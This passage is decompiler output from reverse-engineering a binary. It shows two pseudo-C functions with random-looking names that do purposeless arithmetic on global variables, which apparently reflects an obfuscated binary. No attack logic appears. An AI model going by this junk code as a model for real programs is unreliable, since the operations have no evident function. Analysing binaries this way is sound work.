// 40AB92: using guessed type int dword_40AB92;
// 40ABC2: using guessed type int dword_40ABC2;
// 40AD42: using guessed type int *off_40AD42;

//----- (00406DF7) --------------------------------------------------------
void __stdcall kJAZuY_hvjqel_v_wuvzz(unsigned int a1, unsigned __int16 a2)
{
  *off_40ACEA[0] |= dword_40AB46;
  dword_40ABC2 = dword_40AB16 | (unsigned __int8)dword_40ABC2;
  rect.right = (__PAIR64__(rect.right, dword_40ABE6) - __PAIR64__(*off_40AC9A[0], dword_40ABC2)) >> 32;
}
// 40AB16: using guessed type int dword_40AB16;
// 40AB46: using guessed type int dword_40AB46;
// 40ABC2: using guessed type int dword_40ABC2;
// 40ABE6: using guessed type int dword_40ABE6;
// 40AC9A: using guessed type int *off_40AC9A[14];
// 40ACEA: using guessed type int *off_40ACEA[15];

//----- (00406E3E) --------------------------------------------------------
void __stdcall xcfq_xwotK(unsigned int *a1)
{
  unsigned int v1; // [esp+18h] [ebp-4h]

  dword_40AB8A = (unsigned __int8)dword_40AB8A - *off_40ACF2[0];
  dword_40ABE2 = dword_40AB6E + (v1 < dword_40AB8A) + (unsigned __int8)dword_40ABE2;
  dword_40AB12 &= *off_40ACA2[0];
}
// 406E59: variable 'v1' is possibly undefined
// 40AB12: using guessed type int dword_40AB12;
// 40AB6E: using guessed type int dword_40AB6E;
// 40AB8A: using guessed type int dword_40AB8A;
// 40ABE2: using guessed type int dword_40ABE2;
// 40ACA2: using guessed type int *off_40ACA2[12];
// 40ACF2: using guessed type int *off_40ACF2[13];

// nfuncs=33 queued=32 decompiled=32 lumina nreq=0 worse=0 better=0
// ALL OK, 32 function(s) have been successfully decompiled
